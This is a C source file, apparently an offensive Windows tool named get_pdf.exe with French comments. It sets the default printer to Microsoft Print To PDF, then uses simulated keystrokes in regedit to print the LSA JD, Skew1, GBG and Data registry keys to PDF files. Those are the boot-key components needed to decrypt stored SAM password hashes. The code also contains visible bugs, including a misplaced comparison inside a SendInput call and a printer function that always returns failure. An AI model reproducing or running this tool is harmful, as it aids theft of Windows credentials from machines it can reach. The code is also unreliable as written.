#include <windows.h>
#include <winspool.h>
#include <stdio.h>

void SendKey(WORD key) {
    INPUT input = { 0 };
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = key;
    SendInput(1, &input, sizeof(INPUT));
    // Relâcher la touche
    input.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &input, sizeof(INPUT));
}

BOOL SendCtrlP() {
    INPUT inputs[4] = { 0 };

    inputs[0].type = INPUT_KEYBOARD;
    inputs[0].ki.wVk = VK_CONTROL;
    inputs[0].ki.dwFlags = 0;

    inputs[1].type = INPUT_KEYBOARD;
    inputs[1].ki.wVk = 'P';
    inputs[1].ki.dwFlags = 0;

    inputs[2].type = INPUT_KEYBOARD;
    inputs[2].ki.wVk = 'P';
    inputs[2].ki.dwFlags = KEYEVENTF_KEYUP;

    inputs[3].type = INPUT_KEYBOARD;
    inputs[3].ki.wVk = VK_CONTROL;
    inputs[3].ki.dwFlags = KEYEVENTF_KEYUP;
    if (SendInput(4, inputs, sizeof(INPUT) == 0))
        return FALSE;
    else
        return TRUE;
}

void SendString(const char* str, int layout) {
    for (const char* p = str; *p; p++) {
        if (*p == '&') {
            INPUT input[2] = { 0 };
            input[0].type = INPUT_KEYBOARD;
            input[0].ki.wVk = 0;
            input[0].ki.wScan = layout == 2 ? 0x26 : 0x31; // '&' for QWERTY, '1' for AZERTY
            input[0].ki.dwFlags = KEYEVENTF_UNICODE;

            SendInput(1, &input[0], sizeof(INPUT));
            Sleep(100);

            input[0].ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
            SendInput(1, &input[0], sizeof(INPUT));
        }
        else {
            SHORT key = VkKeyScan(*p);
            SendKey(LOBYTE(key));
        }
        Sleep(50);
    }
}
void SendBackslash(int layout) {
    INPUT input[2] = { 0 };
    input[0].type = INPUT_KEYBOARD;
    input[0].ki.wVk = 0;
    input[0].ki.wScan = layout == 2 ? VK_OEM_5 : 0x5C;
    input[0].ki.dwFlags = KEYEVENTF_UNICODE;
    SendInput(1, &input[0], sizeof(INPUT));
    Sleep(100);
    input[0].ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
    SendInput(1, &input[0], sizeof(INPUT));
}


BOOL SendToRegeditAndSaveAsPDF(const char* keyName, int layout) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcess(TEXT("C:\\Windows\\regedit.exe"), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("Erreur lors du lancement de regedit.exe\n");
        return FALSE;
    }
    Sleep(1000);
    SendKey(VK_TAB);
    Sleep(100);
    SendKey(VK_TAB);
    Sleep(100);

    SendString("HKEY_LOCAL_MACHINE", layout);
    SendBackslash(layout);
    SendString("SYSTEM", layout);
    SendBackslash(layout);
    SendString("CurrentControlSet", layout);
    SendBackslash(layout);
    SendString("Control", layout);
    SendBackslash(layout);
    SendString("Lsa", layout);
    SendBackslash(layout);
    SendString(keyName, layout);
    Sleep(100);

    SendKey(VK_RETURN);
    Sleep(100);

    if (!SendCtrlP())
        return FALSE;

    Sleep(100);

    for (int i = 0; i < 6; i++) {
        SendKey(VK_TAB);
        Sleep(100);
    }

    SendKey(VK_RETURN);
    Sleep(1000);

    SendString(keyName, layout);
    Sleep(100);

    SendKey(VK_RETURN);
    Sleep(100);

    if (!CloseHandle(pi.hProcess))
        return FALSE;

    if (!CloseHandle(pi.hThread))
        return FALSE;

    return TRUE;
}

BOOL SetMicrosoftPrintToPDFPrinter() {
    const wchar_t printerName[] = L"Microsoft Print To PDF";
    HANDLE hPrinter = NULL;
    BOOL ret = FALSE;
    DWORD needed, returned;

    EnumPrinters(PRINTER_ENUM_LOCAL, NULL, 2, NULL, 0, &needed, &returned);
    PPRINTER_INFO_2W pPrinterInfo = (PPRINTER_INFO_2W)malloc(needed);
    EnumPrinters(PRINTER_ENUM_LOCAL, NULL, 2, (LPBYTE)pPrinterInfo, needed, &needed, &returned);

    for (DWORD i = 0; i < returned; i++) {
        wchar_t wszPrinterName[256];
        MultiByteToWideChar(CP_ACP, 0, pPrinterInfo[i].pPrinterName, -1, wszPrinterName, 256);

        if (_wcsicmp(wszPrinterName, printerName) == 0) {
            printf("Found Microsoft Print To PDF printer: %s\n", pPrinterInfo[i].pPrinterName);

            if (OpenPrinter(pPrinterInfo[i].pPrinterName, &hPrinter, NULL)) {
                SetDefaultPrinter(pPrinterInfo[i].pPrinterName);
                ClosePrinter(hPrinter);
            }
            else {
                printf("Failed to open printer\n");
                goto end;
            }

            break;
        }
    }

    end:
    free(pPrinterInfo);

    return ret;
}

int main(int argc, char* argv[]) {
    int layout = 1; // Par défaut, AZERTY
    if (argc > 1 && argc < 3) {
        int arg = atoi(argv[1]);
        if (arg == 2) {
            layout = 2; // QWERTY
        }
    }
    else
    {
        printf("[!] Commande exemple : get_pdf.exe 1 or get_pdf.exe 2\n1 for AZERTY keyboard\n2 for QWERTY keyboard\n");
        goto fail;
    }


    if (!SetMicrosoftPrintToPDFPrinter())
        goto fail;

    if (!SendToRegeditAndSaveAsPDF("Skew&", layout))
        goto fail;

    if(!SendToRegeditAndSaveAsPDF("GBG", layout))
        goto fail;

    if(!SendToRegeditAndSaveAsPDF("JD", layout))
        goto fail;
    if(!SendToRegeditAndSaveAsPDF("DATA", layout))
        goto fail;

    return EXIT_SUCCESS;

fail:
    printf("[!] Error during the execution of tools !\n");
    return EXIT_FAILURE;
}